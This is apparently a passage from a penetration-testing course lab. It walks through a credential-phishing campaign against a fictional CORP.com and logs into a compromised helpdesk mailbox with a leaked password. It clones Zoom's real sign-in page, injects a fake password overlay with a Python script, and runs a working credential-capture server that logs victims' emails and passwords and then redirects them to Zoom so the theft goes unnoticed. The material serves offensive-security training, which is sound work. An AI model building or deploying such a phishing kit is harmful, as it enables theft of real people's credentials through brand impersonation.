## 11.3.1. Creating a Zoom credential phishing pretext

In this section, we'll develop a generic credential phishing campaign. For the purposes of simplicity, we will assume that we have already performed extensive research on our target organization, and have gained low-privileged access to an email account obtained through a public password leak. We'll use this to create a pretext (with the help of some AI tools), then spin up a malicious credential-stealing website.

The compromised email account (**helpdesk@mail.corp.com**) belongs to the helpdesk department of the **CORP.com** enterprise. This account appears to be shared among multiple users and only contains internal email correspondence. While we have access to the email address, the credentials don't seem to be reused anywhere else. Our next step is to use this limited access to attempt to expand our control and obtain more sensitive data.

Let's navigate to **http://192.168.X.77/mail/** to access the webmail portal on the **MAILER** machine.

The IP address of the webmail server will be different in your lab instance. Replace **192.168.X.77** with the IP address that's generated when you start the labs.

We'll use the credentials contained in the public leak data, logging in with the **helpdesk@mail.corp.com** username and enter **Helpdesk@Password2024** as the password.

## 11.3.3. Cleaning up the clone

We have a few things we need to do before our phishing page is ready for prime time. The original cookie banner doesn't function, the login form doesn't submit, and there's no password field. We'll address each of these issues using a Python script to modify the HTML.

Let's start by fixing the cookie banner. We'll write a Python script that removes the broken OneTrust cookie consent banner and replaces it with a working replica. The script also needs to wire up the _Next_ button so it transitions to a password entry screen, just like the real Zoom login flow.

Since the Zoom login page uses a two-step authentication flow (email first, then password), we'll replicate this by creating an overlay _div_ that appears when the user clicks _Next_. This overlay will display a password form while keeping the page header and sidebar image visible underneath.

Let's first identify the button _id_ we need to target. We can use `grep` to search for the _Next_ button in the HTML.

```
kali@kali:~/ZoomSignin$ grep -oP '.{0,100}Next</span>' signin.html
aria-disabled=false id=signin_btn_next data-testid=account-next-btn><span class=zoom-button__label>Next</span>
```

> Listing 10 - Finding the Next button's _id_ attribute

The button has an _id_ of `signin_btn_next`. Now let's write our modification script. We'll re-clone the page first to make sure we're working with a clean copy.

```
kali@kali:~/ZoomSignin$ rm ~/ZoomSignin/signin.html
kali@kali:~/ZoomSignin$ single-file "https://zoom.us/signin" ~/ZoomSignin/signin.html --browser-executable-path /usr/bin/chromium
```

> Listing 11 - Re-cloning the page to start fresh

Next, we'll create a Python script that performs all of our modifications in one pass. This script will:

1. Remove the broken OneTrust cookie consent banner
2. Add an `onclick` handler to the _Next_ button that triggers our custom password step
3. Add _Enter_ key support on the email field
4. Inject a password overlay that mimics Zoom's second login step
5. Add a working cookie banner that matches the original's appearance

```

    "onetrust-consent-sdk",
    "onetrust-banner-sdk",
    "onetrust-pc-sdk",
    "ot-sdk-btn-floating",
    "ot-cookie-notice",
]:
    elem = soup.find(id=elem_id)
    if elem:
        elem.decompose()

html = str(soup)

# Make the Next button call our function
html = html.replace(
    'id="signin_btn_next"',
    'id="signin_btn_next" onclick="goToPassword()"'
)

# Add Enter key support on email field
html = html.replace(

)
```

> Listing 12 - Running the Python script to modify the cloned page

Let's break down what this script does. First, it parses the saved HTML with BeautifulSoup and removes the OneTrust cookie/consent elements by their IDs, including `onetrust-consent-sdk`, `onetrust-banner-sdk`, `onetrust-pc-sdk`, `ot-sdk-btn-floating`, and `ot-cookie-notice`. The script appends three elements to the end of the HTML file. The first is a hidden overlay div that serves as the password entry step. This overlay is positioned to cover only the right side of the page (starting at 46% from the left), so the Zoom header and sidebar image remain visible underneath. The overlay includes a "Enter your password" heading, the captured email address, a password input field, a "Stay signed in" checkbox, and a "Sign in" submit button.

The second element is a small JavaScript block containing the `goToPassword()` function. When called, it reads the email from the input field, populates the overlay with the email address, stores it in a hidden form field, and displays the overlay.

The third element is a replacement cookie banner styled to resemble the original. Clicking _Cookies Settings_ or the close button simply hides the banner.

## 11.3.4. Capturing credentials

Now that our cloned page looks convincing and the login flow works, we need a way to actually capture the credentials that victims submit. Our Python modification script already configured the password form to POST to `http://127.0.0.1:8080/creds`. Now we need a listener on that port to receive and log the submissions.

Let's create a simple Python credential server. This script will listen for POST requests, extract the email and password from the form data, print them to the terminal, and redirect the victim to the real Zoom login page so they assume the login simply failed.

```
kali@kali:~/ZoomSignin$ cat > cred_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        print(f'\n[+] Raw data: {raw}')
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'[+] Captured credentials!')
        print(f'    Email:    {email}')
        print(f'    Password: {password}\n')
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
PYEOF
```

> Listing 13 - Creating the credential capture server

This script creates a minimal HTTP server that listens on port 8080. When it receives a POST request, it parses the form data, prints the captured email and password to the terminal, and sends a 302 redirect to the real Zoom sign-in page. From the victim's perspective, it looks like their login attempt simply failed and they need to try again.

Let's start the credential server in one terminal.

```
kali@kali:~/ZoomSignin$ python3 cred_server.py
```

> Listing 14 - Starting the credential capture server

```

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
